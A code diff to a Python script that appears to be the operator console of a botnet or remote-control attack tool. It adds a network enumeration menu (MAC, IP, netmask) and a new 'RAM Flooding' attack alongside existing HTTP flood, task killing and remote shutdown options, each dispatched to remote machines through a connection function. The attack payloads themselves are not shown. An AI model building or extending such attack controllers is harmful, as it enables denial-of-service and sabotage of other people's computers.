@@ -43,11 +43,12 @@ def connection(ActualValue):
 
 def enumvalue():
     value = ""
-    accepted_command = ["U", "O", "C", "M","F","E","B"]
+    accepted_command = ["U","O","C","M","N","F","E","B"]
     print("[U] User Enum \n"
           "[O] OS Enum \n"
           "[C] CPU Enum \n"
           "[M] Memory Enum \n"
+          "[N] Network Enum \n"
           "[F] Firewall Enum \n"
           "[E] Exit \n"
           "[B] Back \n")
@@ -75,10 +76,15 @@ def enumvalue():
               "3. Cache Memory ** \n")
         value = input("Which value you would like to extract? \n")
     elif accepted_command[4] == type:
-        value = "1"
+        print("1. MAC Address \n"
+              "2. IP Address \n"
+              "3. Netmask \n")
+        value = input("Which value you would like to extract? \n")
     elif accepted_command[5] == type:
-        print("Connection Closed")
+        value = "1"
     elif accepted_command[6] == type:
+        print("Connection Closed")
+    elif accepted_command[7] == type:
         main()
     else:
         print("Invalid Command")
@@ -90,10 +96,11 @@ def enumvalue():
 def attackcommand():
     value = ""
     global processName
-    accepted_command = ["1","2","E"]
+    accepted_command = ["1","2","3","4","E"]
     print("[1] HTTP request Flood \n"
           "[2] Task Killing \n"
           "[3] Remote Shut Down \n"
+          "[4] RAM Flooding \n"
           "[E] Exit \n")
     type = input("What is your attack category? \n")[0]
 
@@ -111,6 +118,11 @@ def attackcommand():
         print(ActualValue)
         connection(ActualValue)
     elif accepted_command[3] == type:
+        value = "4"
+        ActualValue = type + value
+        print(ActualValue)
+        connection(ActualValue)
+    elif accepted_command[4] == type:
         print("Connection Closed")
     else:
         print("Invalid Command")
